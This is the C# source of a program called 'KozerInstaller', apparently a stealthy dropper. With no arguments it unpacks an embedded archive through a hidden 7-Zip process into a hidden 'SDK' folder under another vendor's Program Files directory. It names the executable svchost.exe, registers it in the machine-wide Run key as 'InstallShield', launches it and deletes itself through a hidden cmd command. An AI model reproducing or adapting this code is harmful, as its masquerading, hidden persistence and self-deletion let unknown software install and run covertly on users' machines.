using System.IO;
using System.Diagnostics;
using System;
using System.Reflection;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Threading;

namespace KozerInstaller
{
    class KozerInstallerSource
    {
        static void Main(string[] args)
        {
             handle(args);
        }
        static void handle(string[] args)
        {
            bool developer = args != null && args.Length == 1 && args[0].Equals("Developer");
            if (developer)
                Consoller.AllocConsole();
            new Installer(developer);
        }
}
    class NameConstants
    {
        public const string nameInAutoLaunch = "InstallShield";
        public const string archiveAndFolderName = "SDK";
        public const string exeFileName = "svchost.exe";
    }
    class Installer
    {
        private void uninstall()
        {
            Console.WriteLine("Uninstalling...");
            try
            {
                new Launcher().endProcesses();
                new Extractor().untract();
            }
            catch { }
            try
            {
                new Scheduler().unschedule();
            }
            catch { }
            Console.WriteLine("Uninstalled");
        }
        private void install()
        {
            Console.WriteLine("Installation...");
            new Extractor().extract();
            new Scheduler().schedule();
            new Launcher().launch();
            Console.WriteLine("Installed");
        }
        private void reinstall()
        {
            Console.WriteLine("Reinstalling...");
            uninstall();
            install();
            Console.WriteLine("Reinstalled");
        }
        private bool installed()
        {
            bool inst = Directory.Exists(Destinator.destDir);
            return inst;
        }

        private void checkerDeveloper()
        {
            Console.WriteLine("Hello, you are welcome to install Kozer");
            bool exit = false;
            while (!exit)
            {
                Console.WriteLine("Write a command...");
                string input = Console.ReadLine().ToLower();
                switch (input)
                {
                    case "help":
                        Console.WriteLine("<Kozer Installer Commands>");
                        Console.WriteLine("help");
                        Console.WriteLine("install");
                        Console.WriteLine("delete");
                        Console.WriteLine("reinstall");
                        Console.WriteLine("isinstalled");
                        Console.WriteLine("stop");
                        Console.WriteLine("launch");
                        Console.WriteLine("islaunched");
                        Console.WriteLine("exit");
                        Console.WriteLine("</Kozer Installer Commands>");
                        break;
                    case "delete":
                        Console.WriteLine("Deleting...");
                        new Launcher().endProcesses();
                        Console.WriteLine("Deleted");
                        break;
                    case "install":
                        if (installed())
                            Console.WriteLine("The program is installed, use either \"delete\" or \"reinstall\"");
                        else
                            install();
                        break;
                    case "uninstall":
                        if (!installed())
                            Console.WriteLine("The program is not installed, use \"install\"");
                        else
                            uninstall();
                        break;
                    case "reinstall":
                        if (!installed())
                            Console.WriteLine("The program is not installed, use \"install\"");
                        else
                            reinstall();
                        break;
                    case "launch":
                        if (!installed())
                            Console.WriteLine("The program is not installed, use \"install\"");
                        else
                        {
                            Console.WriteLine("Launching...");
                            new Launcher().launch();
                            Console.WriteLine("Launched");
                        }
                    break;
                    case "stop":
                        if (!installed())
                            Console.WriteLine("The program is not installed, use \"install\"");
                        else
                        {
                            Console.WriteLine("Stopping...");
                            new Launcher().endProcesses();
                            Console.WriteLine("Stopped");
                        }
                    break;
                    case "exit":
                        exit = true;
                        new SelfDeleter().deleteMe();
                        break;
                    case "exitwdm":
                        exit = true;
                        break;
                    case "isinstalled":
                        Console.WriteLine(installed());
                        break;
                    case "islaunched":
                        Console.WriteLine(new Launcher().isLaunched());
                        break;
                    case "getdir":
                        Console.WriteLine(Destinator.destDir);
                        break;
                    default:
                        Console.WriteLine("Can not recognize the command, use \"help\"");
                        break;
                }
            }
        }
        private void checkerUser()
        {
            if (installed())
                uninstall();
            install();
            new SelfDeleter().deleteMe();
        }

        public Installer(bool developer)
        {
            if (developer)
                checkerDeveloper();
            else checkerUser();
        }
    }
    class Destinator
    {
        public static readonly string destDir = getDestinationDirectory();
        public static readonly string exePath = getFullExePath();

        private static string getDestinationDirectory()
        {
            string d = "C:\\Program Files";
            string[] dirs = Directory.GetDirectories(d);
            string dir = null;
            string[] bad = { "microsoft", "windows", "google" };
            foreach (string dr in dirs)
            {
                bool was = false;
                foreach (string bd in bad)
                    if (dr.ToLower().Contains(bd))
                        was = true;
                if (!was)
                    dir = dr;
            }
            if (dir == null)
                dir = d;
            return dir + '\\' + NameConstants.archiveAndFolderName;
        }
        private static string getFullExePath()
        {
            return destDir + '\\' + NameConstants.exeFileName;
        }
    }
    class Extractor
    {
        const string namespaceName = "KozerInstaller.";
        const string arName = NameConstants.archiveAndFolderName;
        const string outArchive = arName + ".zip";
        const string zipExeOut = "7zG.exe";
        const string zipDLLOut = "7-zip.dll";
        const string zipDLL2Out = "7z.dll";
        const string tempDir = "C:\\Temp\\ComEvInst\\";
        
        private void extractResource(string file)
        {
            extractResource(namespaceName + file, tempDir + file);
        }
        private void extractResource(string resName, string fileName)
        {
            using (Stream resource = GetType().Assembly.GetManifestResourceStream(resName))
            using (Stream output = File.OpenWrite(fileName))
            {
                resource.CopyTo(output);
                Console.WriteLine("Extracted " + fileName);
            }
        }
        private void preextract()
        {
            extractResource(outArchive);
            extractResource(zipDLLOut);
            extractResource(zipDLL2Out);
            extractResource(zipExeOut);
            Console.WriteLine("Extracted from itself");
        }
        private void decompress()
        {
            Process process = new Process();
            process.StartInfo.FileName = tempDir + zipExeOut;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.Arguments = "x \"" + tempDir + outArchive + "\"" + " -o" +  getJustTempDirName();
            process.Start();
            process.WaitForExit();
            Console.WriteLine("Archive extracted");
        }
        private void delPreFiles()
        {
            File.Delete(tempDir + outArchive);
            File.Delete(tempDir + zipDLLOut);
            File.Delete(tempDir + zipDLL2Out);
            File.Delete(tempDir + zipExeOut);
            Console.WriteLine("Files Deleted");
        }
        private void move()
        {
            Directory.Move(tempDir + arName, Destinator.destDir);
            DirectoryInfo di = new DirectoryInfo(Destinator.destDir);
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            Console.WriteLine("Directory moved");
        }
        private string getJustTempDirName()
        {
            return tempDir.Substring(0, tempDir.Length - 1);
        }
        public void extract()
        {
            Directory.CreateDirectory(getJustTempDirName());
            preextract();
            decompress();
            delPreFiles();
            move();
            Directory.Delete(getJustTempDirName(), true);
        }
        public void untract()
        {
            Directory.Delete(Destinator.destDir, true);
        }
    }
    class SelfDeleter
    {
        public void deleteMe()
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetEntryAssembly().Location + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }
    }
    class Launcher
    {
        public void launch()
        {
            endProcesses();
            Process.Start(new ProcessStartInfo(Destinator.exePath));
        }
        public void endProcesses()
        {
            foreach (Process p in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Destinator.exePath)))
                if (p.MainModule.FileName.Equals(Destinator.exePath))
                    p.Kill();
            Thread.Sleep(10);
        }
        public bool isLaunched()
        {
            foreach (Process p in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Destinator.exePath)))
                if (p.MainModule.FileName.Equals(Destinator.exePath))
                    return true;
            return false;
        }
    }
    class Scheduler
    {
        public void schedule()
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(NameConstants.nameInAutoLaunch, Destinator.exePath);
            rk.Dispose();
        }
        public void unschedule()
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.DeleteValue(NameConstants.nameInAutoLaunch);
            rk.Dispose();
        }
    }

    class Consoller
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AllocConsole();
    }
}
